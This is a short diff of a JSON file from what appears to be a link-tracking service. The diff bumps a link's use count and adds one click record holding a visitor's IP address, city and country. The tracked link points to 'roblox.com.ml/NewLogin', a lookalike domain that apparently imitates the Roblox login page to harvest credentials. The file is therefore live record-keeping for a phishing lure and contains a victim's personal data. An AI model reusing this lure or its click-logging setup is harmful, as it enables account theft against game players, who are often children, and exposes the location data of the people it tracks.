@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 637,
+    "useCount": 638,
     "createdBy": "admin",
     "clicks": [
       {
@@ -5208,6 +5208,14 @@
         "city": "Piura",
         "flag": "🇵🇪",
         "countryCode": "PE"
+      },
+      {
+        "timestamp": 1777121518589,
+        "ip": "68.152.23.48",
+        "country": "United States",
+        "city": "Brooklyn",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
